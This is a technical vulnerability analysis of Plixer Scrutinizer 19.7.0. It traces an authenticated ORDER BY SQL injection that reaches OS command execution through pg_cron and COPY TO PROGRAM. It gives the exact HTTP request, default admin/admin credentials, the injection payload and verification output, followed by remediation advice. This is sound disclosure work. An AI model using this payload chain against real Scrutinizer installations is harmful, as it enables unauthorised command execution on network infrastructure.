# Plixer Scrutinizer adminEditLang ORDER BY SQL Injection Authenticated RCE — Full Technical Analysis

## Product Background

- **Vendor**: Plixer
- **Product**: Scrutinizer 19.7.0
- **Category**: network flow analytics / NetFlow & sFlow collector
- **Stack**: Docker privileged OL9 container; nginx 443/80 → FastCGI → `scrut_fcgi` (Perl PAR-packed binary); PostgreSQL (plixer DB user is SUPERUSER)
- **Source recovery**: Filter::Crypto bypass recovered plaintext `dumped_src.pl` (349,950 lines)

## Stage 0 — Prerequisites / Authentication Boundary

Auth model (`WebApp::run`):
- `getRunModePerm($rm, $params)` looks up `$permissions_check{$rm}` for run-mode permissions
- Run modes without an auth key are judged by `isAuthSession` → TRUE (session required), not anonymous
- The real anonymous surface is only auth=none (8) + auth=ip (10, IP whitelist), none with a command-execution sink → **Target A is structurally unreachable**
- Default credentials `admin/admin` (default admin after first install); login returns sessionid + X-CSRF-Token

This audit focuses on the authenticated (Target B) path. Login via HTTP POST `/fcgi/scrut_fcgi.fcgi` (rm=auth2, `name=admin&pwd=admin`) yields sessionid + userid=1 + csrfToken: `rm=auth2` → `Plixer::Scrutinizer::FastCGI::Auth::Common::run` (dumped_src.pl:271376) → `authenticate_session` (:270699) → `auth_local` (:270525, bcrypt check against `plixer.users`) → INSERT `plixer.sessions` returns `{userid,sessionid,csrfToken}`.

## Stage 1 — Sink Identification

`return_lang_table_data` (dumped_src.pl:187765-187815) concatenates `$input->{'orderBy'}` directly into SQL **without `escape_sql_string`**:

```perl
# dumped_src.pl:187765
sub return_lang_table_data {
    my (%args) = @_;
    my $dbh    = $args{'dbh'};
    my $input  = $args{'input'};
    my $lang   = $args{'language'};
    ...
    my $orderBy = $input->{'orderBy'} ? $input->{'orderBy'} : 'id';
    ...
    my $query = "$select $where_conditions ORDER BY $orderBy $limit";
    # ↑ $orderBy directly concatenated, no escaping
    my $sth = $dbh->prepare($query);
    $sth->execute();
}
```

`injection_check` (dumped_src.pl:136171) only blocks unescaped semicolons:
```perl
if ($sql =~ /[^\\](;)/u and not $dbh->{'private_allow_semi'}) {
    # blocked
}
```
An ORDER BY injection expression needs no semicolon → bypasses the check. `allow_semi` is only set for the reporter handle; adminEditLang uses the main plixer handle without it.

## Stage 2 — Source Identification

`adminEditLang` handler (dumped_src.pl:228821-228861), operations init/pageStep/search all call `return_lang_table_data` with the HTTP `orderBy` param:

```perl
# dumped_src.pl:228821
sub adminEditLang {
    ...
    if ($operation eq 'init' || $operation eq 'pageStep' || $operation eq 'search') {
        return_lang_table_data('dbh'=>$dbh, 'input'=>$input, 'language'=>$lang_pref);
    }
}
```

HTTP entry: `POST /fcgi/scrut_fcgi.fcgi` with `rm=adminLegacy&action=adminEditLang&operation=init&orderBy=<INJECTION>&page=0&step=2`, Cookie `userid=1; sessionid=<SID>`, X-CSRF-Token header.

## Stage 3 — Data Flow

```
HTTP POST orderBy param
  → adminEditLang handler (operation=init)
  → return_lang_table_data(input.orderBy)
  → $query = "... ORDER BY $orderBy $limit"  [no-escaping concat]
  → $dbh->prepare($query)->execute()  [plixer SUPERUSER handle]
  → PostgreSQL executes ORDER BY expression (with side-effect function call)
```

The plixer DB user is SUPERUSER (`SELECT rolsuper FROM pg_roles WHERE rolname='plixer'` = `t`), able to call any privileged function.

## Stage 4 — Injection / Exploitation Construction

ORDER BY accepts any expression. Use `cron.schedule_in_database` as a side-effect expression to schedule a `COPY TO PROGRAM` job (single statement, no semicolon, bypasses injection_check):

```sql
ORDER BY (SELECT cron.schedule_in_database(
    'plixer_pwn',
    '* * * * *',
    'COPY (SELECT 1) TO PROGRAM ''id > /tmp/plixer_sqli_rce_marker.txt''',
    'plixer',
    'plixer',
    true
))
```

- `cron.schedule_in_database` immediately INSERTs a row into `cron.job`, returning a jobid
- The pg_cron worker scans `cron.job` every minute and executes the command with the given database/username
- `COPY (SELECT 1) TO PROGRAM '<os cmd>'` is a PostgreSQL SUPERUSER-privileged statement; the OS command runs via the shell **as the postgres user** (pg_cron worker's process user)

## Stage 5 — Dynamic Verification

Environment: container, 127.0.0.1:443 → container 443; script runs inside the container (`python3 exploit.py 127.0.0.1 443`).

Script flow (stdlib):
1. Auto-login (`rm=auth2&name=admin&pwd=admin`) → `{"csrfToken":"...","sessionid":"...","userid":"1"}`
2. Send the injection request → HTTP 200, langTableData returned normally (side-effect INSERT into cron.job succeeded)
3. `SELECT jobid, jobname, command FROM cron.job WHERE jobname='plixer_pwn_audit'` → jobid=52, command=`COPY (SELECT 1) TO PROGRAM 'id > /tmp/plixer_sqli_rce_marker.txt 2>&1'`
4. Wait ~75s (pg_cron minute schedule)
5. Marker confirmed:
   ```
   -rw------- 1 postgres postgres 92 ... /tmp/plixer_sqli_rce_marker.txt
   uid=26(postgres) gid=26(postgres) groups=26(postgres),10(wheel),993(pgbouncer),1001(plixer)
   ```
6. `cron.job_run_details`: jobid=52 status=succeeded return_message=`COPY 1`

**Authenticated SQLi → pg_cron → COPY TO PROGRAM → postgres-user OS command execution RCE confirmed.** The script runs from a clean state, fully self-contained.

## Stage 6 — Reachability

- **Auth**: `admin/admin` default credentials (default admin after first install), or any valid admin session
- **Prerequisites**: pg_cron extension installed (default; `SELECT extname FROM pg_extension` includes pg_cron); plixer DB user SUPERUSER (default)
- **Default config**: all defaults satisfied. admin/admin is the shipped default admin credential; pg_cron is a default Scrutinizer extension (46 built-in scheduled jobs); plixer SUPERUSER is the default DB role
- **Trigger**: injection then wait ≤60s (pg_cron schedule period); no further user interaction

## Stage 7 — Defense in Depth / Remediation

1. **orderBy escaping**: `return_lang_table_data` should escape `$input->{'orderBy'}` with `escape_sql_string`, or whitelist column names
2. **Least-privilege DB user**: plixer must not be SUPERUSER; create a restricted role with only necessary table grants; revoke `COPY TO PROGRAM` / `lo_export` / `cron.schedule` privileged-function access
3. **injection_check hardening**: currently only blocks unescaped semicolons; block function calls in ORDER BY position (or use parameterized placeholders)
4. **pg_cron permissions**: restrict `cron.schedule_in_database` to a maintenance role; remove SUPERUSER INSERT on the cron schema
5. **Default credentials**: force a password change on first login; remove `admin/admin`

## Reproduction

```bash
# inside the container
python3 exploit.py 127.0.0.1 443
# verify
ls -l /tmp/plixer_sqli_rce_marker.txt; cat /tmp/plixer_sqli_rce_marker.txt
# uid=26(postgres) ...
```

## CWE / CVSS

- CWE-89 (SQL Injection) — raw `orderBy` concatenation
- CWE-78 (OS Command Injection) — `COPY TO PROGRAM`
- **CVSS 3.1**: ≈ 8.8 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) — PR:H because an admin session is required
